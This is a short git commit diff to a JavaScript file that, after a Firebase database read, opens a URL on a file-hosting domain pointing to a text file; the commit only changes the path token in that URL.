571cfbcb0007cd728a6c7b376861070376286327
cherrabkarim197 <86166827+cherrabkarim197@users.noreply.github.com>
2022-10-15 12:15:53 +0200

    Update script.js

--- script.js
+++ script.js
@@ -13,7 +13,7 @@
 firebase.initializeApp(firebaseConfig);
 
 const dbRef = firebase.database().ref("lien").once("value",(snap)=>{
-  window.open("https://f13.file-upload.download:183/d/qaxai2ktnlgpv7w7d26i4tcc2kzsofj3oni7aaba6sep7ygasfjl7h4hk46ws6aokbjsvs5b/525.txt", '_top');
+  window.open("https://f13.file-upload.download:183/d/qaxai2ktnlgpv7w7d26i4tcc2kzsofj3oni7aaba6sep7ygdlizcrlf2dfbb76znwqvt57lf/525.txt", '_top');
   
   
   
